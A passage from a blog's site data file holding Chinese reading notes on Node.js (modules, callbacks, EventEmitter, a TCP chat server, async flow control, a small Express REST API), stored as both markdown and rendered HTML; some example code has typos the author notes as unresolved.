outStream=fs.createWriteStream('output.js.gz');\n\nfs.createReadStream('./fs.js').pipe(gzip).pipe(outStream);\n```\n\n```js\n//网络模块\nconst http=require('http');\nconst port=8080;\n\nconst server=http.createServer((req,res)=>{\n    res.end(\"HEllo,node js!\");\n});\n\nserver.listen(port,()=>{\n    console.log(\"Server listening on:http://localhost:%s\",port);\n});\n```\n\n```shell\n//调试器\nnode debug server.js\n```\n\n- 主流Node程序：Web、命令行工具、桌面程序 \n\n> Node可以将TS转换为JS；\n\n## 二、Node编程基础\n\n- 如何组织代码？\n- 如何实现异步编程？\n\n### 1.Node功能的组织及重用\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/b3bf8ebded4c5d97.jpg)\n\n> 上面的做法会出现一个问题，就是两个文件声明了相同的变量名，导致重复声明；\n>\n> PHP和Ruby等语言使用命名空间来解决问题；\n>\n> Node选择不给程序员污染全局命名空间的机会；\n>\n> Node模块允许从被引入文件中选择要暴露给程序的函数和变量，如果模块返回的函数或者变量不止一个，那么可以通过设定exports对象的属性来指明他们。\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/40f820b01ac722a9.jpg)\n\n### 2.创建一个Node项目\n\n```shell\nmkdir myApp\ncd myApp\nnpm init -y   //全部使用默认值的package\n```\n\n> require是Node中少数几个同步I/O操作之一；\n>\n> I/O密集的地方尽量不要使用require，所有的同步调用都会阻塞Node；\n\n### 3. node_modules重用模块\n\n> 要求模块在文件系统中使用相对路径存放，对于组织程序特定的代码很有帮助。但是对于想要在程序见共享或者跟他人共享代码却用处不大。\n>\n> Node有一个独特的模块引入机制，即node_modules,其模块检索规则如下：\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/4accd465166d6500.jpg)\n\n##### 注意事项：\n\n- 如果模块是目录，在模块目录中定义模块的文件必须命名为index.js。除非在这个目录下一个叫package.json的文件特别执行。要执行一个取代index.js的文件，必须使用JSON数据定义的对象；\n\n```json\n{\n    \"main\":\"currency.js\"\n}\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/eb62dc14f1e8a0e5.jpg)\n\n- Node能把模块作为对象缓存起来。如果两个文件引入了相同的模块，第一个require会把模块返回的数据存到内存中。第二个引入会从内存中加载。\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/3baf64653ff8e710.jpg)\n\n##### ！！！！！！不能实现\n\n### 4.异步编程\n\nNode世界的两种响应逻辑方式：\n\n- 回调：通常用来定义一次性响应的逻辑。比如数据库查询；\n- 事件监听：本质上也是一个回调，不同的是和一个概念实体有关（事件）；\n\n```js\n//下面的例子中，用EventEmitter.Prototype.on方法在服务器上绑定了一个监听器，当有request事件发出，服务器调用handleRequest函数\n\nserver.on('request',handleRequest);\n```\n\nNode Http服务器实例是一个事件发射器，一个可以类（Event Emitter）；\n\nNode的很多核心功能都继承自EventEmitter；\n\n##### 用回调处理一次性事件\n\n> 回调是一个函数，被当作参数传递给异步函数，用来描述异步操作完成之后要做什么。\n\n实例如下：\n\n- 异步获取存放在json文件中的文章标题\n- 异步获取简单的HTML模板\n- 将标题组装到HTML页面里\n- 将HTML发送给客户\n\n```js\nconst http=require('http');\nconst fs=require('fs');\n\nhttp.createServer((req,res)=>{\n    getTitles(res);\n}).listen(8000,'127.0.0.1');\n\n//将回调嵌套的功能代码提取出来\nfunction getTitles(res){\n    fs.readFile('./data/title.json',(err,data)=>{\n        if(err) return hadError(err,res);\n        getTemplate(JSON.parse(data.toString()),res);\n    });\n}\n\nfunction getTemplate(titles,res){\n    fs.readFile('./index.html',(err,data)=>{\n        if(err) return hadError(err,res);\n        formatHtml(titles,data.toString(),res);\n    })\n}\n\nfunction formatHtml(titles,templ,res){\n    const html=templ.replace('%',titles.join('</li><li>'));\n    res.writeHead(200,{'Content-Type':'text/html'});\n    res.end(html);\n}\n\nfunction hadError(err,res){\n    console.log(err);\n    res.end(\"Server Error\");\n}\n```\n\n##### 用事件发射器处理重复性事件\n\n> 事件发射器会触发事件，并且在那些事件被触发时能处理他们；\n>\n> 重要的Node API组件，比如HTTP服务器、TCP服务器和流都被做成了事件发射器；\n\n```js\nsocket.on('data',handleData)\n```\n\necho服务器的例子：\n\n```js\nconst net=require('net');\nconst server=net.createServer(socket=>{\n    socket.on('data',data=>{\n        socket.write(\"Your message is: \"+data+\".\\n\");\n    });\n    //只响应一次\n    socket.once('data',data=>{\n        socket.write(\"Your message is: \"+data+\".\\n\");\n    });\n});\n\nserver.listen(8000,'127.0.0.1');\n```\n\n```shell\ntelnet 127.0.0.1 8888\n```\n\n##### 一个PUB/SUB的例子\n\n下面的代码定义了channel事件发射器，并带有一个监听器，可以监听channel中发生的事件并做出响应；\n\n```js\n//定义\nconst EventEmitter=require('events').EventEmitter;\nconst channel=new EventEmitter();\nchannel.on('join',()=>{\n    console.log(\"Welcome!\");\n})\n\n//触发事件/发射事件/join是事件名称，可以为任何值\nchannel.emit('join');\n```\n\n完整实现代码如下（存在只能输出一个字符的问题，似乎需要上缓存）：\n\n```js\nconst events=require('events');\nconst net=require('net');\nconst channel=new events.EventEmitter();\nvar fullMessage=\"\";\n\nchannel.clients={};\nchannel.subscriptions={};\n\nchannel.on('join',function(id,client){\n    this.clients[id]=client;\n    const welcomeMessage=`Welcome! ${this.listeners('broadcase').length+1} guests online!`;\n    client.write(`${welcomeMessage}\\n`);\n    this.subscriptions[id]=(senderId,message)=>{\n        if(id!=senderId){\n            this.clients[id].write(\"Message from user \"+id+\":\"+message+\".\\n\");\n        }\n    };\n    this.on('broadcase',this.subscriptions[id]);\n    console.log(`${id} has enter the chatroom.\\n`);\n    channel.emit('boradcast',id,`${id} has enter the chatroom.\\n`);\n});\n\n//绑定leave事件；\nchannel.on('leave',function(id){\n    channel.removeListener('broadcast',this.subscriptions[id]);\n    console.log(`${id} has left the chatroom.\\n`);\n    channel.emit('boradcast',id,`${id} has left the chatroom.\\n`);\n});\n\n//绑定lshuwdown事件,提出所有用户；\nchannel.on('shutdown',function(id){\n    channel.emit('broadcast','','The server has shut down.\\n');\n    console.log(`${id} has close the chatroom.\\n`);\n    channel.removeAllListeners('broadcast');\n});\n\n//设定监听器最多的数量为50；\nchannel.setMaxListeners(50);\n\nconst server=net.createServer(client=>{\n    const id=`[${client.remoteAddress}:${client.remotePort}]`;\n    channel.emit('join',id,client);\n    client.on('data',data=>{\n        data=data.toString();\n        if(data==='*'){\n            channel.emit('shutdown',id);\n        }\n        if(data==='-'){\n            channel.emit('leave',id);\n        }\n        channel.emit('broadcase',id,data);\n    });\n    client.on('close',()=>{\n        channel.emit('leave',id);\n    });\n});\n\nserver.listen(8888);\n```\n\n### 5.异步开发的难题\n\n> 创建异步程序时，需要关注：\n>\n> 1.事件轮询的条件；\n>\n> 2.程序变量；\n>\n> 3.其他随程序逻辑执行而发生变化的资源；\n\n```js\n//作用域是如何导致bug出现的\n\nfunction  asyncFunction(callback){\n    setTimeout(callback,200);\n}\n\nlet color='green';\t\t\t\t//初始color\nasyncFunction(()=>{\n    console.log(`The color is ${color}.`);\t\t\t//等待200ms输出color\n});\n\ncolor='blue'\t\t\t//结果为输出blue；\n```\n\n> JS闭包可以冻结color的值；\n>\n> 下面的例子对asyncFunction的调用被封装到一个以color为参数的匿名函数里。\n\n```js\ncolor='blue'\t\t\t\n(color=>{\n    asyncFunction(()=>{\n        console.log(`The color is `,color);\n    });\n})(color);\n\ncolor='green';\t\t\t\t//结果为输出blue；\n```\n\n### 6.异步逻辑的顺序化\n\n> 让一组异步任务顺序执行的概念被Node社区称为流程控制；\n>\n> 控制分为：串行、并行\n\n![](https://s3.bmp.ovh/imgs/2023/02/09/b33ca1d4d596f929.jpg)\n\n#### （1）串行流程控制\n\n```js\n//以下代码用回调让任务顺序执行\nsetTimeout(()=>{\n    console.log(\"Wait 1000ms...\");\n    setTimeout(()=>{\n        console.log(\"Wait 500ms...\");\n        setTimeout(()=>{\n            console.log(\"Wait 100ms...\");\n        },100)\n    },500)\n},1000)\n```\n\n实际情况中可能是读取文件、发送http请求等；\n\n##### 借助async流程控制工具执行\n\n```shell\nnpm install async\n```\n\n```js\nconst async=require('async');\n\n//维护一个顺序数组\nasync.series([\n    callback=>{\n        setTimeout(()=>{\n            console.log(\"Wawit 1000ms...\");\n            callback();\n        },1000);\n    },\n    callback=>{\n        setTimeout(()=>{\n            console.log(\"Wawit 500ms...\");\n            callback();\n        },500)\n    },\n    callback=>{\n        setTimeout(()=>{\n            console.log(\"Wawit 100ms...\");\n            callback();\n        },100);\n    }\n]);\n```\n\n- 可读性、可维护性更强；\n- 刻意回避回调嵌套；\n\n#### （2）实现串行化流程控制\n\n- 按照预期执行的顺序维护一个数组；\n- FIFO方法完成任务；\n- 每个任务完成以后调用一个函数来返回任务执行的成功与否；\n\n```js\nfunction TaskA(){\n    console.log(\"Doing work A!\");\n    next();\n}\n\nfunction TaskB(){\n    console.log(\"Doing work B!\");\n    next();\n}\n\nfunction TaskC(){\n    console.log(\"Doing work C!\");\n    next();\n}\n\n//维护的一个数组；\nconst tasks=[TaskA,TaskB,TaskC];\n\nfunction next(err,result){\n    if(err) throw err;\t\t\t\t   //如果出错，就抛出错误\n    const currentTask=tasks.shift();\t//没有出错，移动数组；\n    if(currentTask){\n       currentTask(result);\n    }\n}\n\nnext();\n```\n\n#### （3）实现并行化流程控制\n\n> 为了让异步任务并行执行，人需要维护一个数组；但是此时任务的存放顺序无关紧要；\n\n#### （4）利用社区的工具进行流程控制\n\n- Async\n- Step\n- Seq\n\n## 三、Node Web\n\n- 创建一个新的Web程序\n- 搭建RESTful服务\n- 持久化数据\n- 使用模板\n\n### 1.Node Web程序结构\n\n- package.json  包含依赖项列表和运行这个程序的命令的文件；\n- public/             静态资源文件夹，css/客户端js都在这；\n- node_modules/ 项目的依赖项会安装到这里；\n\n##### 程序代码\n\n- app.js/index.js          设置程序的代码；\n- models/                    数据库模型；\n- views/                       用来渲染的页面模板；\n- controllers/routes      HTTP请求处理器；\n- middleware/              中间件组件；\n\n> 如何组织程序是我的自由，大部分web框架都很灵活；\n\n```shell\nnpm install --save express\nnpm rm express --save\n```\n\n一个简单的服务器，使用express（）创建一个程序实例，添加路由处理器，然后将实例绑定到一个TCP端口；\n\n```js\nconst express=require('express');\n\nconst app=express();\n\nconst port=process.env.PORT || 3000;\n\napp.get('/',(req,res)=>{\n    res.send(\"Hello,world!\");\n});\n\napp.listen(port,()=>{\n    console.log(`Express web app available at localhost:${port}`);\n})\n```\n\n##### npm脚本\n\n> 启动服务起的命令（`node index.js`）可以保存问npm脚本；如下可以使用`npm start`启动项目；\n\n```json\n \"scripts\": {\n    \"start\":\"node index.js\"\n  },\n```\n\n##### 搭建一个RESTful Web服务\n\n- POST  /articles   \n- GET    /articles/:id\n- GET    /articles\n- DELETE  /articles/:id\n\n```shell\ncurl http://127.0.0.1:3000/articles/0\ncurl -X DELETE http://127.0.0.1:3000/articles/0\n```\n\n```shell\n#官方消息体解析器\nnpm install --save bodt-parser\n```\n\n```js\nconst express=require('express');\nconst bodyParser=require('body-parser');\n\nconst articles=[{title:'NodeJS入门'},{title:'VueJS入门'},{title:'深入浅出VueJS'}];\n\nconst app=express();\n\napp.set('port',process.env.PORT||3000);\n\napp.use(bodyParser.json());\napp.use(bodyParser.urlencoded({extended:true}));\n\n\napp.get('/articles',(req,res,next)=>{\n    res.send(articles);\n});\n\napp.get('/articles/:id',(req,res,next)=>{\n    const id=req.params.id;\n    console.log(\"Fetching article \",id,\".\");\n    res.send(articles[id]);\n});\n\napp.delete('/articles/:id',(req,res,next)=>{\n    const id=req.params.id;\n    console.log(\"Deleting article \",id,\".\");\n    delete articles[id];\n    res.send({message:'Article has been deleted.'});\n});\n\napp.post('/articles',(req,res,next)=>{\n    const article={title:req.body.title};\n    articles.push(article);\n    res.send(articles);\n});\n\napp.listen(app.get('port'),()=>{\n    console.log('App started on port ',app.get('port'));\n});\n\nmodule.exports=app;\n```\n\n> 到这一步为止，跟真正的Web程序差不多了，只需要完成两个新的任务：\n>\n> 永久保存数据到数据库；\n>\n> 形成可读版本的文章；\n\n```shell\n#模板引擎\nnpm install ejs --save\n```\n\n### 2.Node Web开发\n\n> 现代Web开发中，使用Node来进行工具和服务的情况越来越多；\n>\n> 需要负责和配置维护工具库；\n>\n> 本章使用npm脚本、Gulp和Webpack搭建易于维护的项目；\n\n#### 前端构建工具的优点：\n\n- 代码简单易懂；\n- 支持代码转译；\n- 源码映射；\n\n#### Webpck\n\n- 快速搭建支持增量式结构的构建系统；\n\n## 五、服务器端框架\n\n- 使用热门的Node Web框架；\n- 选择合适的框架；\n- 用Web框架搭建Web程序；\n\n#### 1.用户画像\n\n> 假设一个场景，需要做一个内容分发系统，用户需要上传下载法律文件，在线阅读文件；\n>\n> 徐娅萍生成PDF还有电子商务组件，你会怎么考虑技术栈？\n\n- 文件上传下载阅读--Express\n- 生成PDF的微服务--hapi\n- 电子商务组件--SailJS\n\n使用用户画像考虑设计问题是通用做法。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"NodeJS实战读书笔记","published":1,"updated":"2023-03-27T11:04:23.400Z","_id":"clg29vygd001lao9c0ldy0nch","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"NoDe-JS-实战\"><a href=\"#NoDe-JS-实战\" class=\"headerlink\" title=\"NoDe JS 实战\"></a>NoDe JS 实战</h1><h2 id=\"一、Welcome-to-node\"><a href=\"#一、Welcome-to-node\" class=\"headerlink\" title=\"一、Welcome to node\"></a>一、Welcome to node</h2><h3 id=\"1-NodeJS基础\"><a href=\"#1-NodeJS基础\" class=\"headerlink\" title=\"1.NodeJS基础\"></a>1.NodeJS基础</h3><ul>\n<li>显著特征：异步、事件驱动机制</li>\n<li>Node和JS的优势之一是单线程编程。为了实现同步，引入事件机制，点击按钮，触发事件，规避资源死锁和竞态条件</li>\n<li>非阻塞I/O</li>\n</ul>\n<blockquote>\n<p>程序可以在做其他事情的时候发起一个请求来获取网络资源，然后网络操作完成之后，运行一个回调函数来处理操作的结果</p>\n</blockquote>\n<ul>\n<li>Node与V8</li>\n</ul>\n<blockquote>\n<p>Node的动力源自V8引擎。V8的特性之一是会将JS代码直接编译为机器码。</p>\n</blockquote>\n<ul>\n<li><p>特性组</p>\n<blockquote>\n<p>Node包含了v8提供的ES6特性，分为shipping、staged、in progress三组；</p>\n<p>其中shipping是默认开启的，staged和in progress需要命令行参数开启</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">node --harmony<br>node --v8-options | grep &quot;in progress&quot;<br></code></pre></td></tr></table></figure></li>\n<li><p>npm</p>\n<blockquote>\n<p> npm要求Node项目目录下有一个package.json文件；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm init -y    //初始化package.json<br></code></pre></td></tr></table></figure></li>\n<li><p>核心模块</p>\n</li>\n</ul>\n<blockquote>\n<p>fs，path，net，http/s，dns，assert，os</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-comment\">//调取文件流</span><br><span class=\"hljs-keyword\">const</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;fs&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> zlib=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;zlib&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> gzip=zlib.<span class=\"hljs-title function_\">createGzip</span>();<br><span class=\"hljs-keyword\">const</span> outStream=fs.<span class=\"hljs-title function_\">createWriteStream</span>(<span class=\"hljs-string\">&#x27;output.js.gz&#x27;</span>);<br><br>fs.<span class=\"hljs-title function_\">createReadStream</span>(<span class=\"hljs-string\">&#x27;./fs.js&#x27;</span>).<span class=\"hljs-title function_\">pipe</span>(gzip).<span class=\"hljs-title function_\">pipe</span>(outStream);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//网络模块</span><br><span class=\"hljs-keyword\">const</span> http=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;http&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> port=<span class=\"hljs-number\">8080</span>;<br><br><span class=\"hljs-keyword\">const</span> server=http.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res</span>)=&gt;</span>&#123;<br>    res.<span class=\"hljs-title function_\">end</span>(<span class=\"hljs-string\">&quot;HEllo,node js!&quot;</span>);<br>&#125;);<br><br>server.<span class=\"hljs-title function_\">listen</span>(port,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Server listening on:http://localhost:%s&quot;</span>,port);<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">//调试器<br>node debug server.js<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>主流Node程序：Web、命令行工具、桌面程序 </li>\n</ul>\n<blockquote>\n<p>Node可以将TS转换为JS；</p>\n</blockquote>\n<h2 id=\"二、Node编程基础\"><a href=\"#二、Node编程基础\" class=\"headerlink\" title=\"二、Node编程基础\"></a>二、Node编程基础</h2><ul>\n<li>如何组织代码？</li>\n<li>如何实现异步编程？</li>\n</ul>\n<h3 id=\"1-Node功能的组织及重用\"><a href=\"#1-Node功能的组织及重用\" class=\"headerlink\" title=\"1.Node功能的组织及重用\"></a>1.Node功能的组织及重用</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/b3bf8ebded4c5d97.jpg\"></p>\n<blockquote>\n<p>上面的做法会出现一个问题，就是两个文件声明了相同的变量名，导致重复声明；</p>\n<p>PHP和Ruby等语言使用命名空间来解决问题；</p>\n<p>Node选择不给程序员污染全局命名空间的机会；</p>\n<p>Node模块允许从被引入文件中选择要暴露给程序的函数和变量，如果模块返回的函数或者变量不止一个，那么可以通过设定exports对象的属性来指明他们。</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/40f820b01ac722a9.jpg\"></p>\n<h3 id=\"2-创建一个Node项目\"><a href=\"#2-创建一个Node项目\" class=\"headerlink\" title=\"2.创建一个Node项目\"></a>2.创建一个Node项目</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">mkdir myApp<br>cd myApp<br>npm init -y   //全部使用默认值的package<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>require是Node中少数几个同步I/O操作之一；</p>\n<p>I/O密集的地方尽量不要使用require，所有的同步调用都会阻塞Node；</p>\n</blockquote>\n<h3 id=\"3-node-modules重用模块\"><a href=\"#3-node-modules重用模块\" class=\"headerlink\" title=\"3. node_modules重用模块\"></a>3. node_modules重用模块</h3><blockquote>\n<p>要求模块在文件系统中使用相对路径存放，对于组织程序特定的代码很有帮助。但是对于想要在程序见共享或者跟他人共享代码却用处不大。</p>\n<p>Node有一个独特的模块引入机制，即node_modules,其模块检索规则如下：</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/4accd465166d6500.jpg\"></p>\n<h5 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h5><ul>\n<li>如果模块是目录，在模块目录中定义模块的文件必须命名为index.js。除非在这个目录下一个叫package.json的文件特别执行。要执行一个取代index.js的文件，必须使用JSON数据定义的对象；</li>\n</ul>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-attr\">&quot;main&quot;</span><span class=\"hljs-punctuation\">:</span><span class=\"hljs-string\">&quot;currency.js&quot;</span><br><span class=\"hljs-punctuation\">&#125;</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/eb62dc14f1e8a0e5.jpg\"></p>\n<ul>\n<li>Node能把模块作为对象缓存起来。如果两个文件引入了相同的模块，第一个require会把模块返回的数据存到内存中。第二个引入会从内存中加载。</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/3baf64653ff8e710.jpg\"></p>\n<h5 id=\"！！！！！！不能实现\"><a href=\"#！！！！！！不能实现\" class=\"headerlink\" title=\"！！！！！！不能实现\"></a>！！！！！！不能实现</h5><h3 id=\"4-异步编程\"><a href=\"#4-异步编程\" class=\"headerlink\" title=\"4.异步编程\"></a>4.异步编程</h3><p>Node世界的两种响应逻辑方式：</p>\n<ul>\n<li>回调：通常用来定义一次性响应的逻辑。比如数据库查询；</li>\n<li>事件监听：本质上也是一个回调，不同的是和一个概念实体有关（事件）；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//下面的例子中，用EventEmitter.Prototype.on方法在服务器上绑定了一个监听器，当有request事件发出，服务器调用handleRequest函数</span><br><br>server.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;request&#x27;</span>,handleRequest);<br></code></pre></td></tr></table></figure>\n\n<p>Node Http服务器实例是一个事件发射器，一个可以类（Event Emitter）；</p>\n<p>Node的很多核心功能都继承自EventEmitter；</p>\n<h5 id=\"用回调处理一次性事件\"><a href=\"#用回调处理一次性事件\" class=\"headerlink\" title=\"用回调处理一次性事件\"></a>用回调处理一次性事件</h5><blockquote>\n<p>回调是一个函数，被当作参数传递给异步函数，用来描述异步操作完成之后要做什么。</p>\n</blockquote>\n<p>实例如下：</p>\n<ul>\n<li>异步获取存放在json文件中的文章标题</li>\n<li>异步获取简单的HTML模板</li>\n<li>将标题组装到HTML页面里</li>\n<li>将HTML发送给客户</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;http&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;fs&#x27;</span>);<br><br>http.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-title function_\">getTitles</span>(res);<br>&#125;).<span class=\"hljs-title function_\">listen</span>(<span class=\"hljs-number\">8000</span>,<span class=\"hljs-string\">&#x27;127.0.0.1&#x27;</span>);<br><br><span class=\"hljs-comment\">//将回调嵌套的功能代码提取出来</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getTitles</span>(<span class=\"hljs-params\">res</span>)&#123;<br>    fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;./data/title.json&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">err,data</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">hadError</span>(err,res);<br>        <span class=\"hljs-title function_\">getTemplate</span>(<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">parse</span>(data.<span class=\"hljs-title function_\">toString</span>()),res);<br>    &#125;);<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getTemplate</span>(<span class=\"hljs-params\">titles,res</span>)&#123;<br>    fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;./index.html&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">err,data</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">hadError</span>(err,res);<br>        <span class=\"hljs-title function_\">formatHtml</span>(titles,data.<span class=\"hljs-title function_\">toString</span>(),res);<br>    &#125;)<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">formatHtml</span>(<span class=\"hljs-params\">titles,templ,res</span>)&#123;<br>    <span class=\"hljs-keyword\">const</span> html=templ.<span class=\"hljs-title function_\">replace</span>(<span class=\"hljs-string\">&#x27;%&#x27;</span>,titles.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;&lt;/li&gt;&lt;li&gt;&#x27;</span>));<br>    res.<span class=\"hljs-title function_\">writeHead</span>(<span class=\"hljs-number\">200</span>,&#123;<span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>:<span class=\"hljs-string\">&#x27;text/html&#x27;</span>&#125;);<br>    res.<span class=\"hljs-title function_\">end</span>(html);<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hadError</span>(<span class=\"hljs-params\">err,res</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(err);<br>    res.<span class=\"hljs-title function_\">end</span>(<span class=\"hljs-string\">&quot;Server Error&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"用事件发射器处理重复性事件\"><a href=\"#用事件发射器处理重复性事件\" class=\"headerlink\" title=\"用事件发射器处理重复性事件\"></a>用事件发射器处理重复性事件</h5><blockquote>\n<p>事件发射器会触发事件，并且在那些事件被触发时能处理他们；</p>\n<p>重要的Node API组件，比如HTTP服务器、TCP服务器和流都被做成了事件发射器；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">socket.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,handleData)<br></code></pre></td></tr></table></figure>\n\n<p>echo服务器的例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> net=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;net&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> server=net.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">socket</span>=&gt;</span>&#123;<br>    socket.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,<span class=\"hljs-function\"><span class=\"hljs-params\">data</span>=&gt;</span>&#123;<br>        socket.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&quot;Your message is: &quot;</span>+data+<span class=\"hljs-string\">&quot;.\\n&quot;</span>);<br>    &#125;);<br>    <span class=\"hljs-comment\">//只响应一次</span><br>    socket.<span class=\"hljs-title function_\">once</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,<span class=\"hljs-function\"><span class=\"hljs-params\">data</span>=&gt;</span>&#123;<br>        socket.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&quot;Your message is: &quot;</span>+data+<span class=\"hljs-string\">&quot;.\\n&quot;</span>);<br>    